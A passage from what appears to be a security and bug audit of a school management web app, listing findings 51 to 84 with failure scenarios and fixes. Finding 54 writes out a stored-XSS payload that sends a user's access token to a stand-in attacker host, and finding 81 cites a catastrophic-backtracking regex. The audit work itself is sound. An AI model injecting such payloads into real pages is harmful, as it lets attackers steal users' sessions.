- **Fix:** In campusly-frontend/src/lib/constants.ts, replace the single 'Term Planner' entry at line 295 with a 'Workbench' NavItem (href ROUTES.TEACHER_WORKBENCH, module 'teacher_workbench') whose children are Term Planner, Marking Hub, Question Bank, Paper Builder and Moderation. Add marking-hub and question-bank to QUICK_ACTIONS in app/(dashboard)/teacher/workbench/page.tsx, and add '/teacher/workbench' to allowedPrefixes in app/(dashboard)/layout.tsx if standalone teachers are meant to have it.

### 51. Logout never revokes the refresh token server-side — the cookie path prevents it from reaching /auth/logout

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/Auth/controller.ts:147`
- **Failure:** A teacher finishes on a shared staff-room PC and clicks Sign out. useAuth.logout POSTs /api/auth/logout; the browser omits refresh_token because its Path is /api/auth/refresh, so the `if (req.user?.id && refreshToken)` guard is false and the $pull never runs. The refresh token remains in that user's User.refreshTokens array and stays valid for its full 7 days, so anyone holding a captured copy can keep minting access tokens after the teacher believes the session ended.
- **Fix:** In campusly-backend/src/modules/Auth/controller.ts, change REFRESH_COOKIE_OPTIONS.path from '/api/auth/refresh' to '/api/auth' (and the matching res.clearCookie path in logout) so the cookie is sent to both /refresh and /logout; or have AuthController.logout fall back to `AuthService.logoutAll(req.user.id)` when the cookie is absent.

### 52. Changing the password does not revoke existing sessions

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/Auth/service.ts:259`
- **Failure:** A teacher suspects her account was used on the shared staff-room PC and changes her password at /auth/change-password. AuthService.changePassword updates the hash but leaves user.refreshTokens untouched, so the other session's refresh token is still in the array and keeps minting access tokens for up to 7 days. (Note: the password-RESET path is not affected — resetPassword already clears refreshTokens.)
- **Fix:** In campusly-backend/src/modules/Auth/service.ts changePassword, mirror what resetPassword already does: add `user.refreshTokens = [];` before `await user.save()`, then have AuthController.changePassword issue a fresh token pair and set the new refresh cookie so the caller's own session survives.

### 53. No role guard on /teacher/** (or /admin/**) — only the student subtree is protected

- **Section:** n/a
- **Location:** `campusly-frontend/src/app/(dashboard)/layout.tsx:142`
- **Failure:** A logged-in parent (or a coach with a stale bookmark) navigates to /teacher/grades. AuthGuard passes because they are authenticated, the teacher sidebar and page render, the page's hooks fire teacher API calls, the backend 403s each one, and the user is left staring at empty tables and error toasts on a portal that is not theirs instead of being redirected to their own dashboard.
- **Fix:** Add campusly-frontend/src/app/(dashboard)/teacher/layout.tsx that wraps children in the existing RoleGuard (allowing 'teacher' plus 'super_admin', redirecting others via getRoleDashboardPath(user.role) from src/lib/auth), mirroring app/(dashboard)/student/layout.tsx; do the same for the admin subtree, allowing role 'admin'/'school_admin' and capability holders.

### 54. Stored XSS: chat-derived AI lesson notes are interpolated raw into the PDF-export window

- **Section:** n/a
- **Location:** `src/app/(dashboard)/classroom/[sessionId]/notes/page.tsx:34`
- **Failure:** A student pastes `<img src=x onerror="fetch('https://evil.tld/?t='+localStorage.getItem('accessToken'))">` into session chat. The recording finishes, the lesson-notes job feeds the chat verbatim to the model, which reproduces the string inside keyTerms/studentQuestions/summary. A teacher who navigates to /classroom/<sessionId>/notes (currently only by typing the URL) and clicks 'Export PDF' opens an about:blank window on the app's own origin that executes the payload and exfiltrates their access and refresh tokens.
- **Fix:** Add an `escapeHtml()` helper to src/lib/print-utils.ts and wrap every interpolated value in handleExportPDF (notes/page.tsx:34-63) — summary, each keyConcept, each actionItem, q.question/q.answer, t.term/t.definition — plus options.title/subtitle/metadata inside printContent itself, since teacher/workbench/papers/[id]/memo/page.tsx:116 uses the same sink. Sanitising the model output server-side before persisting LessonNote is a worthwhile second layer.

### 55. read-only (student) whiteboard clients still push scene snapshots

- **Section:** n/a
- **Location:** `src/components/classroom/SharedWhiteboard.tsx:23`
- **Failure:** On a shared classroom PC (or a teacher previewing the student view in a second tab), the read-only tab's Excalidraw fires onChange on a scroll or zoom while its canvas is still empty. handleChange serialises `[]` and writes it into the shared Y.Map, which BroadcastChannel replays into the teacher's tab and wipes the drawing with no undo. Once a y-socket.io server is added, the same unguarded write path lets any student blank the whole class's board.
- **Fix:** Change the hook signature in src/hooks/useExcalidrawCollaboration.ts to accept `readOnly` and return early in handleChange (`if (readOnly) return;`), and pass it from SharedWhiteboard.tsx:23. Enforce it server-side too when the Yjs server lands: reject document updates from participants who are not the session host.

### 56. Whiteboard sync is whole-scene last-writer-wins with an unreliable echo guard

- **Section:** n/a
- **Location:** `src/hooks/useExcalidrawCollaboration.ts:48`
- **Failure:** Once sync works, a teacher and a co-host (HOD sitting in) both draw inside the same 500 ms debounce window: the second snapshot to arrive replaces the first wholesale, so one host's strokes silently disappear. Because updateScene bumps each element's version/versionNonce, the re-serialised scene no longer equals lastSyncedRef, so an onChange landing after the setTimeout(...,0) release re-publishes the just-received scene; with resyncInterval re-emitting every 5 s two clients can trade snapshots indefinitely.
- **Fix:** Replace the single-key snapshot in src/hooks/useExcalidrawCollaboration.ts with a Y.Map keyed by Excalidraw element id (or adopt Excalidraw's reconcileElements helper) so edits merge per element, and gate echoes on element version/versionNonce comparison instead of the timer-released suppressRef boolean.

### 57. Session analytics page can never show poll results (it reads sessions from the upcoming-only list) and the route is unreachable

- **Section:** n/a
- **Location:** `src/app/(dashboard)/teacher/classroom/[id]/analytics/page.tsx:21`
- **Failure:** Teacher finishes a lesson and wants the attendance register plus the poll results they collected. No button or link to /teacher/classroom/<id>/analytics exists anywhere, so they must be told the URL. Typing it loads a page whose header falls back to the generic 'Session Analytics' and where neither Poll Results block renders at all (session is null because the ended session is absent from the upcoming list) — every poll run during the lesson is invisible.
- **Fix:** Replace the useClassroomSessions scan in src/app/(dashboard)/teacher/classroom/[id]/analytics/page.tsx with a direct `apiClient.get(`/classroom/sessions/${sessionId}`)` behind a small hook (the route already permits teachers), and add 'Analytics' plus 'Lesson notes' actions to src/components/classroom/UpcomingSessionCard.tsx along with a past-sessions section on /teacher/classroom so both routes become reachable.

### 58. Classroom analytics endpoints skip teacher ownership and class-access checks

- **Section:** n/a
- **Location:** `src/modules/Classroom/controller.ts:218`
- **Failure:** On a school with the advancedAnalytics entitlement, teacher A opens the sessions list (which populates teacher ids via `.populate('teacherId', ...)`), copies colleague B's id, and calls GET /api/classroom/analytics/teacher/<B>. The API returns B's session count, hours taught, average attendance and recording count. The same teacher calls GET /api/classroom/analytics/class/<any classId in the school> and reads participation and video-watch rates for a class they do not teach.
- **Fix:** In campusly-backend/src/modules/Classroom/controller.ts getTeacherStats, throw ForbiddenError when `req.params.teacherId !== user.id` unless `isAdminRole(user.role)`; in getClassStats, `await SessionService.assertCanAccessClass(user.schoolId!, user.id, user.role, req.params.classId)` before calling AnalyticsService — the same helper every other handler in the module already uses.

### 59. Classroom and video hooks swallow fetch failures, so errors render as "nothing here" empty states

- **Section:** n/a
- **Location:** `src/hooks/useClassroomSessions.ts:30`
- **Failure:** The API is down, the JWT has expired mid-session, or the attendance call 403s because the teacher is not the session host. /teacher/classroom renders a confident 'No sessions scheduled' and 'No videos yet', and the analytics page renders 'No attendance data'. The teacher concludes their scheduled lessons and uploaded videos were deleted; there is no error message and no retry affordance anywhere on the page.
- **Fix:** Return an `error: string | null` from useClassroomSessions, useVideoLibrary and useClassroomAnalytics (mirroring src/hooks/useLessonNotes.ts:63,100) and add `toast.error(extractErrorMessage(err, ...))` as useTeacherCourses.ts:46 does; then in src/app/(dashboard)/teacher/classroom/page.tsx and the analytics page render a distinct error block with a retry button ahead of the empty-state branch.

### 60. Resource picker offers quiz questions the backend will reject, producing an unavoidable 400

- **Section:** n/a
- **Location:** `src/hooks/useCourseResourcePicker.ts:184`
- **Failure:** Teacher building a course searches 'photosynthesis' in the resource picker, multi-selects five matching question-bank items (two of which are short_answer or essay), and clicks Add. POST /courses/:id/lessons rejects the entire batch with 'Quiz lessons may only contain mcq, true_false, or fill_blank questions'; no lesson is created and the teacher has to guess by trial and error which two to drop.
- **Fix:** Filter the question results in src/hooks/useCourseResourcePicker.ts to `['mcq','true_false','fill_blank']` before pushing them into `merged` (or pass a `type` param to /question-bank/questions), and in ResourcePickerDialog.tsx render any remaining non-gradable row disabled with a hint such as 'Not auto-gradable — cannot be added to a quiz lesson'.

### 61. 'hod' and 'principal' are not valid UserRole values — every HOD-gated route is unreachable by real HODs

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-backend/src/modules/QuestionBank/routes.ts:49`
- **Failure:** Any HOD (JWT is `{role:'teacher', isHOD:true}`) who reaches one of these endpoints — by direct URL to /admin/curriculum, or as soon as the HOD moderation UI is wired up — receives `403 You do not have permission to perform this action` from middleware/rbac.ts:12, because 'hod' is not a role that any JWT can ever carry. The same dead strings in service-papers-auth.ts:5 mean an HOD cannot even read a colleague's paper for review.
- **Fix:** Replace `authorize(...HOD_ROLES)` at QuestionBank/routes.ts:115 and Curriculum/routes.ts:78,101,108,117,124 with `requireCapability('manage_academic_setup')` — the pattern ContentLibrary/routes.ts:93 already uses and that common/permissions.ts:38 correctly resolves via `u.isHOD === true`. In service-papers-auth.ts:4-5, replace the role Sets with a check on `actor.isHOD`/`actor.isSchoolPrincipal`. Delete every 'hod'/'principal' literal from authorize() lists and add a unit test asserting every string passed to `authorize()` is a member of `UserRole`.

### 62. Dead route: frontend PATCHes /curriculum/interventions/:id but the backend only registers PUT

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-backend/src/modules/Curriculum/routes.ts:122`
- **Failure:** A school_admin navigates directly to /admin/curriculum, opens the Interventions tab, clicks an intervention and saves a status change. useCurriculumBenchmarks.updateIntervention fires `PATCH /api/curriculum/interventions/<id>`; Express has no PATCH handler on that path so it falls through to the catch-all at app.ts and returns 404 'Route not found'. The page shows 'Failed to update intervention' and the record is never saved. (An HOD would fail one step earlier — listInterventions at routes.ts:117 is also behind the dead HOD_ROLES guard.)
- **Fix:** Add `router.patch('/interventions/:id', requireCapability('manage_academic_setup'), validate(updateInterventionSchema), CurriculumController.updateIntervention);` next to the existing PUT at `src/modules/Curriculum/routes.ts:122` — PATCH is the correct semantic since updateInterventionSchema is a partial. Alternatively change campusly-frontend/src/hooks/useCurriculumBenchmarks.ts:124 to `apiClient.put`.

### 63. Staff creation silently discards department/subjects — the fields are not in the User Mongoose schema

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-backend/src/modules/Staff/controller.ts:124`
- **Failure:** A school_admin adds a teacher through the staff screen with department 'Mathematics' and subjects 'Maths, Physical Sciences'. The POST succeeds with 201, but Mongoose strips both fields before the insert because neither path exists on userSchema. Every later `GET /api/staff` returns `department: ''` and `subjects: []` for that teacher (controller.ts:61-64), so any staff list grouped or filtered by department shows nothing and no error is logged anywhere.
- **Fix:** Add `employeeNumber: { type: String }`, `department: { type: String }`, `subjects: { type: [String], default: [] }` and `qualifications: { type: [String], default: [] }` to `userSchema` and `IUser` in `src/modules/Auth/model.ts`, then delete the `StaffExtras` interface and the `getPopulated<StaffExtras>(u)` workaround at `src/modules/Staff/controller.ts:7-13` and :60.

### 64. Assessment-planner clash check reports the previous day's date in SA (UTC+2)

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-backend/src/modules/TeacherWorkbench/services/planner.service.ts:68`
- **Failure:** On a server running in SAST (UTC+2), a teacher opens the term planner, picks 2026-07-30 and clicks check-for-clashes. `normalizeDate('2026-07-30')` parses the date-only string as UTC midnight, `setHours(0,0,0,0)` shifts it to local midnight = 2026-07-29T22:00Z, and `toIsoDate` renders '2026-07-29'. The clash panel correctly lists the conflicting assessments but labels them as falling on the 29th, one day before the date the teacher selected.
- **Fix:** In `src/modules/TeacherWorkbench/services/planner.service.ts:68`, replace the body of `toIsoDate` with local parts: `const y = date.getFullYear(), m = String(date.getMonth() + 1).padStart(2, '0'), d = String(date.getDate()).padStart(2, '0'); return `${y}-${m}-${d}`;`. Better, also make `normalizeDate` (:59) build UTC midnight from the YYYY-MM-DD parts via `Date.UTC` so stored `plannedDate` values and rendered labels agree on any server timezone.

### 65. Academic create endpoints trust schoolId from the request body

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-backend/src/modules/Academic/controllers/misc.controller.ts:18`
- **Failure:** An HOD-flagged (or standalone) teacher at School A harvests a School B classId and subjectId via the unfiltered `?schoolId=` reads, then POSTs `/api/academic/assessments` with `schoolId` set to School B's ObjectId. requireCapability passes because it only checks the caller's own flags, the Zod schema accepts the foreign schoolId as a required field, and `new Assessment(data).save()` writes the row into School B's tenant, where it shows up in School B's gradebook and becomes a valid target for the unfiltered mark upsert.
- **Fix:** Remove `schoolId` from gradeSchema, subjectSchema, assessmentSchema, examCreateSchema, pastPaperCreateSchema, subjectWeightingCreateSchema and remedialCreateSchema in `src/modules/Academic/validation.ts` (all are `.strict()`, so stale clients get a clear 400), and inject it in the controllers: `AcademicService.createAssessment({ ...req.body, schoolId: req.user!.schoolId! })` at misc.controller.ts:19 and the equivalent at :221, :259, :345, :376, grade.controller.ts:9 and subject.controller.ts:9.

### 66. PaperImport is mounted with no role guard and no module guard

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-backend/src/app.ts:219`
- **Failure:** A student or parent logs into their own portal, takes their normal access token, and POSTs a multipart form with any PDF to `/api/paper-imports`. PaperImportController.create checks only that a file is present, that the Zod body parses, and that the caller has fewer than 2 running jobs — it never looks at user.role — so the job is queued and run through the AI conversion pipeline on the school's spend. Repeat across a student body and the per-user cap of 2 is meaningless.
- **Fix:** Change `src/app.ts:219` to `app.use('/api/paper-imports', authenticate, requireModule('ai_tools'), paperImportRouter);` and add `router.use(authorize('teacher', 'school_admin', 'super_admin'));` immediately after the existing `router.use(authenticate)` in `src/modules/PaperImport/routes.ts`. Consider adding `requireEntitlement` to the POST so import spend honours the subscription tier, matching QuestionBank's paper-generation route.

### 67. Blanking a captured mark saves nothing but reports 'Marks saved successfully'

- **Section:** n/a
- **Location:** `campusly-frontend/src/hooks/useTeacherGrades.ts:206`
- **Failure:** Teacher enters 68 against the wrong learner on the Enter marks grid, notices, and clears that one input (value becomes ''). The unsaved-changes banner appears and Save Marks enables. They click Save; the other rows post, the toast says 'Marks saved successfully' and isDirty clears, then loadMarks() re-fetches and the 68 is back in the cell. Repeating the clear/save loop never removes it — there is no other UI or endpoint that can.
- **Fix:** Send cleared rows explicitly from useTeacherGrades.ts:206 (e.g. include entries whose mark is '' and whose `existingMark !== null` as `{ studentId, clear: true }`), and in AssessmentService.bulkCaptureMarks (assessment.service.ts:160) branch those into an `updateOne` that sets `isDeleted: true` scoped by `{ assessmentId, studentId, schoolId }`. Until that lands, only fire the success toast when `marks.length === markEntries.filter(e => e.mark !== '' || e.existingMark === null).length` and otherwise warn that clearing does not delete.

### 68. Backend never validates bulk marks against the assessment total, and editing totalMarks leaves stored marks/percentages stale

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/Academic/services/assessment.service.ts:160`
- **Failure:** Teacher captures marks for a test they typed as out of 50, saves (Mark rows stored with total 50, percentage on 50), then realises it was out of 100, opens the Edit assessment dialog and changes Total Marks to 100. The Enter marks grid immediately recomputes the displayed % from 100 (page.tsx:127-130), but Class overview still reports the old percentages because term-summary.service.ts:239 divides by the stored Mark.total of 50. The same learner shows e.g. 80% on the capture tab and 40% on the overview tab, and the report card (which also reads mark/total) disagrees again.
- **Fix:** In AssessmentService.bulkCaptureMarks (assessment.service.ts:160-179) ignore `entry.total`, use the loaded `assessment.totalMarks` for both the stored `total` and the percentage, and throw BadRequestError when `entry.mark > assessment.totalMarks` — mirror service-gradebook-publish.ts:34-42. In AssessmentService.updateAssessment (:89-99), when `data.totalMarks` differs from the existing value, run a follow-up bulk update over `Mark.find({ assessmentId: id, schoolId, isDeleted: false })` recomputing `total` and `percentage`.

### 69. Backend silently falls back to a flat average while the UI claims there is no fallback — 'Set weightings' subjects still feed the headline class average

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/Academic/services/term-summary.service.ts:304`
- **Failure:** A school has SubjectWeighting buckets for Maths but none for Life Skills. A teacher opens Gradebook → Class overview: the Life Skills chip is outlined in destructive red with 'Set weightings' and no number, yet the Totals table below shows a Life Skills percentage for every learner (a plain unweighted mean), each learner's Overall column blends it in, and the big 'Class average 63%' at the top averages the policy-weighted Maths figure with the unweighted Life Skills figure. Nothing in the table tells the teacher which columns follow school policy, so figures read off it for parent feedback are not comparable.
- **Fix:** Pick one contract in term-summary.service.ts. Either delete the flat fallback at :309-313 (return null for bucket-less subject/terms) and exclude those subjects from `classOverallAverage` at :403-407 and from each student's `overallAverage` at :360-364; or keep the fallback and add an `isUnweighted` flag to TermSummarySubjectColumn so TermSummaryTotalsTable.tsx:68-83 and the headline in TermSummaryTab.tsx:107-114 can mark those values as unweighted.

### 70. Reporting page and gradebook compute different term averages for the same learner and term

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/Report/services/academic.service.ts:237`
- **Failure:** Term 2, one learner, Maths: a Test scored 60% with Assessment.weight 1 and an Exam scored 80% with Assessment.weight 1, with SubjectWeighting buckets configured Tests 40 / Exams 60. The teacher opens Gradebook → Class overview → clicks the learner and sees 72% for Maths. They then open Teacher → Reporting, generate the same learner's Term 2 report card, and the header reads 'Overall 70%'. Nothing on either screen indicates which calculation is authoritative, and the printed report card is the one that goes to the parent.
- **Fix:** Extract the bucket-weighted subject-average calculation from term-summary.service.ts:302-347 (with getBucketsFor/getWeightingMap from services/subject-weighting.service.ts) into a shared exported function, and call it from ReportAcademicService in campusly-backend/src/modules/Report/services/academic.service.ts:214-252 in place of the Assessment.weight-only accumulation, so one weighting policy produces both figures.

### 71. No error state on the term-summary views: blank overview tab and forever-spinning drilldown dialogs when a fetch fails

- **Section:** n/a
- **Location:** `campusly-frontend/src/components/grades/TermSummaryTab.tsx:86`
- **Failure:** A teacher opens Gradebook for a class whose record fails the lookup in term-summary.service.ts:112-116 (throws NotFoundError 'Class not found'), or hits any 500/network drop. The Class overview tab renders completely empty below the Totals/Tests bar — no message, no retry, no hint — with only a Sonner toast that fades after a few seconds; refreshing reproduces the blank page, so the teacher concludes the gradebook is broken. Equally, clicking a learner row when /academic/students/:id/term-detail 403s (see the missing ownership check) leaves StudentTermDetailDialog spinning forever with no way to distinguish a slow load from a failure.
- **Fix:** Add an `error: string | null` to useTermSummary.ts, useStudentTermDetail.ts, useSubjectTrend.ts and useSubjectWeightings.ts (set in the catch alongside the toast, cleared at the start of each fetch) and expose `refetch` from all four. Replace TermSummaryTab.tsx:86 `if (!summary) return null;` with an inline error card plus a Retry button, and change the `loading || !detail` guards in StudentTermDetailDialog.tsx:53, SubjectTrendDialog.tsx:75 and SubjectWeightingDialog.tsx:123 to spinner-on-loading / error-on-error / empty-on-empty.

### 72. A failed AI marking is unrecoverable — the roster locks out re-upload and the review UI shows no failure reason or retry

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/components/papers/PaperDetailMarkingTab.tsx:245`
- **Failure:** The AI returns prose instead of JSON for one student, so service-marking.ts:154-158 stores status='failed' with errorMessage 'AI returned non-JSON output. Please try again.'. On the paper's Marking tab that student's row now shows a red 'Marking failed' pill and a single 'Review marking' button — the 'Upload pages' and 'Type answers' buttons are gone. Clicking Review opens PaperMarkingReviewDialog → MarkingResults, which shows the student's name, 0/0 (0%), an empty question list, and no explanation at all. The 'Issue Result' button is enabled; clicking through it produces a toast reading 'Only completed, needs_review, or published markings can be issued'. The teacher has to guess that they must leave the paper workspace entirely and redo the student from the standalone Mark Papers wizard.
- **Fix:** In campusly-frontend/src/components/ai-tools/MarkingResults.tsx, add an early branch for `marking.status === 'failed'` that renders `marking.errorMessage` in a destructive banner and hides/disables the Issue button; in PaperDetailMarkingTab.tsx:245 change the condition to `m && m.status !== 'failed' ? ... : ...` so the Upload pages / Type answers CTAs stay available for a failed attempt.

### 73. Marking hooks toast the raw axios message, so the backend's AI-failure reason is never shown to the teacher

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/hooks/useTeacherMarking.ts:156`
- **Failure:** A teacher uploads photos for a student and the AI answers with prose instead of JSON. The backend responds 400 with the message 'AI returned non-JSON output. Please try again.' — precisely the actionable diagnosis. The toast the teacher sees instead reads 'Request failed with status code 400'. The identical thing happens for 'AI response did not match expected structure at "questions.0.marksAwarded"', for 'Paper not found' when a paper was archived mid-session, and for every batch create/confirm/cancel failure.
- **Fix:** Replace the raw-message fallbacks with the helper already imported in the file: `toast.error(extractErrorMessage(err, 'Failed to mark paper. Please try again.'))` at useTeacherMarking.ts:125 and :156, and the equivalent in useTeacherMarkingBatch.ts:45, :72 and :84 (import extractErrorMessage from '@/lib/api-helpers' there).

### 74. Batch polling never times out and swallows every error — a stuck or missing batch spins 'Loading batch...' forever

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/components/ai-tools/BulkBatchFlow.tsx:32`
- **Failure:** A teacher uploads 80 pages for a class and the API process restarts mid-extraction (deploy, crash, OOM). The MarkingBatch document is stuck at status 'extracting' with nothing left to advance it, and the teacher's screen shows a spinner and 'AI is reading paper headers...' indefinitely — no error, no retry, no timeout. The same dead spinner ('Loading batch...') appears if GET /ai-tools/batches/:id returns 404 or 500, because getBatch converts the error to null and the effect just schedules another poll every 2 seconds forever.
- **Fix:** Make getBatch in campusly-frontend/src/hooks/useTeacherMarkingBatch.ts return a discriminated result (e.g. `{ ok: true, batch } | { ok: false, error }`) instead of null-on-everything; in BulkBatchFlow.tsx and MarkingBatchProgress.tsx track poll start time, stop after a budget (say 5 minutes) and render an error state with a Retry/Cancel action. On the backend add a startup sweep that marks batches left in 'extracting' past a deadline as 'failed' with an errorMessage.

### 75. Marking History has no loading state — it flashes the 'No markings yet' empty state on every visit

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/app/(dashboard)/teacher/curriculum/mark-papers/page.tsx:173`
- **Failure:** A teacher finishes bulk-marking a class and clicks 'History' (or lands on /teacher/curriculum/mark-papers and clicks History after a page reload). While GET /ai-tools/markings?limit=100 is in flight the screen reads 'No markings yet — Mark a student paper to see results here.' On a slow school connection that persists for several seconds and reads as if the marking run was lost, before the table suddenly pops in.
- **Fix:** Add a `markingsLoading` state around the fetch in getMarkings (campusly-frontend/src/hooks/useTeacherMarking.ts:163-177), return it from the hook, and in mark-papers/page.tsx render `<LoadingSpinner />` in the history branch (around line 173) while it is true, before MarkingHistoryTable's empty-state branch can run.

### 76. 'Issue' from the History table omits allowAutoCreate/subjectId, so the Issue Result button is permanently disabled when no gradebook entry exists yet

- **Section:** n/a
- **Location:** `c:/Users/shaun/campusly-frontend/src/components/ai-tools/MarkingHistoryTable.tsx:124`
- **Failure:** A teacher bulk-marks a class, opens History, and clicks the paper-plane (send) icon on a completed marking. The dialog shows 'Gradebook entry *' as a required field, then 'No gradebook entries found. Create and finalise a paper first.' — because no Assessment has been auto-created for that paper/class yet — and the 'Issue Result' button is greyed out. Cancel is the only way out. The teacher must instead click the eye icon on the same row, wait for the full record to load, and issue from the review screen, where the identical action works because MarkingResults passes allowAutoCreate.
- **Fix:** In campusly-frontend/src/components/ai-tools/MarkingHistoryTable.tsx:124-138, pass `allowAutoCreate={pendingMarking?.paperType === 'assessment'}` (and the paper's subjectId once available) to IssueResultDialog, mirroring MarkingResults.tsx:253-257.

### 77. Import polling never gives up and the job page has no error state — permanent spinner on any fetch failure

- **Section:** n/a
- **Location:** `src/hooks/usePaperImportPoll.ts:36`
- **Failure:** Teacher opens /teacher/curriculum/import/<id> for a job that was deleted from the Converted Papers list, or belongs to another teacher (PaperImportJobsService.get scopes by schoolId + teacherId, so it 404s), or has a malformed id. Every poll returns 404/500, the catch re-schedules another poll 3 seconds later forever, and because `job` stays null the page shows a spinner for as long as the tab is open while hammering the API. There is no 'could not load this import' message and no way back except the browser chevron.
- **Fix:** In src/hooks/usePaperImportPoll.ts add a failure counter ref, stop scheduling after ~5 consecutive failures, and return `{ job, isPolling, error }`. In src/app/(dashboard)/teacher/curriculum/import/[jobId]/page.tsx render an error Card (mirroring the existing job.status === 'failed' branch, with the Link back to /teacher/curriculum/import/jobs) when `error` is set, and keep the spinner only while isPolling && !error.

### 78. Teacher-created content resources are a dead end — no submit-for-review action exists in any mounted teacher UI

- **Section:** n/a
- **Location:** `src/app/(dashboard)/teacher/curriculum/content/page.tsx:308`
- **Failure:** Teacher generates a worksheet inside a lesson or converts a paper via the importer. The resource is created with status 'draft' (service-resources.ts createResource hardcodes `status:'draft'`, as does GenerationService). On /teacher/curriculum/content the row shows a 'Draft' badge, and the actions menu offers only Preview and Assign as homework — there is no Submit for Review, Edit, or Delete. The teacher has no way to move it to pending_review, so the HOD reviews queue at /hod/curriculum/reviews never sees it, it never becomes 'approved', and it stays invisible to the teacher's own Student Preview page and to textbook chapters (both filter status='approved').
- **Fix:** Add a 'Submit for review' DropdownMenuItem to the actions cell in src/components/content/ResourceListTable.tsx (enabled when row.original.status is 'draft' or 'rejected'), plumb an `onSubmitForReview` prop through from src/app/(dashboard)/teacher/curriculum/content/page.tsx wired to the existing `submitForReview` from useContentLibrary, and refetch on success. Delete src/components/content/ai-studio/ entirely (5 files, ~1000 lines, zero importers) so the dead wizard stops shipping.

### 79. "Download original" links always 401 — plain <a href> to the API with no Authorization header and no access_token cookie

- **Section:** n/a
- **Location:** `src/hooks/usePaperImport.ts:55`
- **Failure:** Teacher finishes a conversion, lands on the results view, and clicks 'Download original' to check the AI transcription against the scan. A new tab opens on http://localhost:4500/api/paper-imports/<jobId>/source with no credentials and shows a raw 401 JSON error page instead of the PDF. The same link on /teacher/curriculum/preview/<resourceId> (the 'Source: filename · pages n–m · Download original' strip) fails identically.
- **Fix:** Replace the URL builder in src/hooks/usePaperImport.ts with a `downloadSource(jobId)` callback that does `apiClient.get(`/paper-imports/${jobId}/source`, { responseType: 'blob' })`, wraps the blob in URL.createObjectURL, triggers a synthetic anchor click using job.source.filename, and revokes the object URL. Change ResultsList.tsx:58-65 and preview/[resourceId]/page.tsx:182-189 from <a href> to a Button calling it.

### 80. Block types the renderer cannot render are offered in the authoring UI (drag_drop, hotspot)

- **Section:** n/a
- **Location:** `src/components/content/BlockEditor.tsx:22`
- **Failure:** Teacher generates an activity or worksheet material from /teacher/lessons/<id>. The generator prompt documents drag_drop as a supported type, and parseAIResponseToBlocks accepts it regardless of the requested block types, so a drag_drop block is stored with its items/targets/correctMapping in metadata. On /teacher/curriculum/preview/<resourceId> that block renders as a dashed 'This content type (drag_drop) is not yet supported' box — content the school was billed AI tokens for, permanently unrenderable. Once manual creation is fixed, the same happens for anything a teacher picks from the Drag & Drop / Hotspot menu entries.
- **Fix:** Remove the `drag_drop` and `hotspot` entries from BLOCK_TYPES in src/components/content/BlockEditor.tsx:17-29 (and from INTERACTIVE_BLOCK_TYPES in ResourceFormDialog.tsx:48-51), and delete section 7 'DRAG_DROP blocks' from buildSystemPrompt in campusly-backend/src/modules/ContentLibrary/service-generation.ts plus the drag_drop branch in parseAIResponseToBlocks, until renderers exist. Also make parseAIResponseToBlocks honour `requestedTypes` rather than the full validTypes set.

### 81. Content-library title search interpolates the raw user string into a regex (no escaping, unlike the Textbook module)

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/ContentLibrary/service-resources.ts:70`
- **Failure:** Teacher on /teacher/curriculum/content types a title containing a bracket or paren — e.g. searching for 'Algebra (Term 2)'. On the keystroke after '(' the effect fires GET /content-library/resources?search=Algebra%20(, MongoDB fails to compile the regex, the request 500s, fetchResources returns false and the page replaces the table with the 'Failed to load resources' EmptyState. A pathological pattern like '(a+)+$' instead pins CPU on a full-collection backtracking scan.
- **Fix:** In campusly-backend/src/modules/ContentLibrary/service-resources.ts add `import { escapeRegex } from '../../common/utils.js';` and change line 70 to `query.title = { $regex: escapeRegex(filters.search), $options: 'i' };` — identical to Textbook/service.ts:260. While there, debounce the search input in src/app/(dashboard)/teacher/curriculum/content/page.tsx so every keystroke is not a round trip.

### 82. Teacher-facing moderation review endpoint is admin-only — every teacher and HOD who uses the Review Queue gets a 403

- **Section:** n/a
- **Location:** `campusly-backend/src/modules/TeacherWorkbench/routes.ts:194`
- **Failure:** Once finding #1 is fixed, an HOD (role 'teacher', isHOD true) or a school principal (role 'teacher', isSchoolPrincipal true) opens /teacher/workbench/papers/moderation. The queue loads because line 189 uses allRoles. They pick Approve, type comments, press Submit Review, and authorize('school_admin','super_admin') rejects them with 403 'You do not have permission to perform this action' — surfaced only as a Sonner toast. No HOD or principal can ever moderate, despite the route comment claiming they can.
- **Fix:** Decide who moderates and enforce it in one place. Either replace adminOnly on routes.ts:194 with a capability guard (`requireCapability('manage_academic_setup')`, which common/permissions.ts already grants to school_admin, isSchoolPrincipal, isHOD and isStandaloneTeacher), or gate the Review Queue tab and ModerationReviewForm in moderation/page.tsx behind the same check so no one is shown an action they cannot perform. Fix the misleading '(admins/HODs only)' comment either way.

### 83. Moderation page compares a populated User object to a string user id — "My Papers" is always empty

- **Section:** n/a
- **Location:** `campusly-frontend/src/app/(dashboard)/teacher/workbench/papers/moderation/page.tsx:33`
- **Failure:** A teacher submits a paper via 'Submit for Moderation' on /teacher/papers/<id>, then opens /teacher/workbench/papers/moderation. `m.submittedBy` arrives as `{ id, _id, firstName, lastName, email }`, so the strict equality against `user?.id` is false for every row: the 'My Papers' tab renders the 'No papers submitted' EmptyState even though their PaperModeration record exists, and their own pending submission is instead listed under 'Review Queue'.
- **Fix:** Widen the type in campusly-frontend/src/types/teacher-workbench.ts:229 to `submittedBy: string | { id: string; firstName?: string; lastName?: string }` and compare with `resolveId(m.submittedBy) === user?.id` in moderation/page.tsx:33-36 (resolveId already exists in lib/api-helpers.ts). Separately widen ModerationService.getModerationQueue beyond `status: 'pending'` if the My Papers tab is meant to show outcomes.

### 84. Workbench memo generate/regenerate queries GeneratedPaper instead of AssessmentPaper

- **Section:** n/a
